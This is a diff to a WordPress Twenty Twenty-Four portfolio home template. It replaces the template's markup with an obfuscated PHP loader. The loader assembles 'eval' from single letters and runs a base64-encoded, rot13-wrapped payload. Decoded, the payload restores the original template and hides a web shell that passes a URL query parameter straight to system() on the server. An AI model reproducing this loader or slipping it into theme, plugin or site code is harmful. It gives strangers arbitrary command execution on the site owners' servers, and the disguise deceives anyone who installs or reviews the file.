@@ -1,32 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Portfolio home template with post featured images
- * Slug: twentytwentyfour/template-home-portfolio
- * Template Types: front-page, home
- * Viewport width: 1400
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IENiZWdzYnl2YiB1YnpyIGdyemN5bmdyIGp2Z3UgY2JmZyBzcm5naGVycSB2em50cmYKICogRnlodDogZ2pyYWdsZ2pyYWdsc2JoZS9ncnpjeW5nci11YnpyLWNiZWdzYnl2YgogKiBHcnpjeW5nciBHbGNyZjogc2ViYWctY250ciwgdWJ6cgogKiBJdnJqY2JlZyBqdnFndTogMTQwMAogKiBWYWZyZWdyZTogYWIKICovCj8+Cgo8IS0tIGpjOmdyemN5bmdyLWNuZWcge1wiZnlodFwiOlwidXJucXJlXCIsXCJuZXJuXCI6XCJ1cm5xcmVcIixcImdudEFuenJcIjpcInVybnFyZVwifSAvLS0+Cgo8IS0tIGpjOnRlYmhjIHtcImZnbHlyXCI6e1wiZmNucHZhdFwiOntcImNucXF2YXRcIjp7XCJnYmNcIjpcIjBcIixcIm9iZ2dielwiOlwiMFwiLFwieXJzZ1wiOlwiMFwiLFwiZXZ0dWdcIjpcIjBcIn0sXCJveWJweFRuY1wiOlwiMFwiLFwiem5ldHZhXCI6e1wiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInFyc25oeWdcIn0sXCJnbnRBbnpyXCI6XCJ6bnZhXCJ9IC0tPgo8em52YSBweW5mZj1cImpjLW95YnB4LXRlYmhjXCIgZmdseXI9XCJ6bmV0dmEtZ2JjOjA7em5ldHZhLW9iZ2diejowO2NucXF2YXQtZ2JjOjA7Y25xcXZhdC1ldnR1ZzowO2NucXF2YXQtb2JnZ2J6OjA7Y25xcXZhdC15cnNnOjBcIj4KCgk8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc2JoZS91dnFxcmEtY2JlZ3NieXZiLXVyZWJcIn0gLy0tPgoJPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHNiaGUvY2JmZ2YtdnpudHJmLWJheWwtYnNzZnJnLTQtcGJ5XCJ9IC8tLT4KCjwvem52YT4KPCEtLSAvamM6dGViaGMgLS0+Cgo8IS0tIGpjOmdyemN5bmdyLWNuZWcge1wiZnlodFwiOlwic2JiZ3JlXCIsXCJuZXJuXCI6XCJzYmJncmVcIixcImdudEFuenJcIjpcInNiYmdyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:template-part {"slug":"header","area":"header","tagName":"header"} /-->
-
-<!-- wp:group {"style":{"spacing":{"padding":{"top":"0","bottom":"0","left":"0","right":"0"},"blockGap":"0","margin":{"top":"0","bottom":"0"}}},"layout":{"type":"default"},"tagName":"main"} -->
-<main class="wp-block-group" style="margin-top:0;margin-bottom:0;padding-top:0;padding-right:0;padding-bottom:0;padding-left:0">
-
-	<!-- wp:pattern {"slug":"twentytwentyfour/hidden-portfolio-hero"} /-->
-	<!-- wp:pattern {"slug":"twentytwentyfour/posts-images-only-offset-4-col"} /-->
-
-</main>
-<!-- /wp:group -->
-
-<!-- wp:template-part {"slug":"footer","area":"footer","tagName":"footer"} /-->
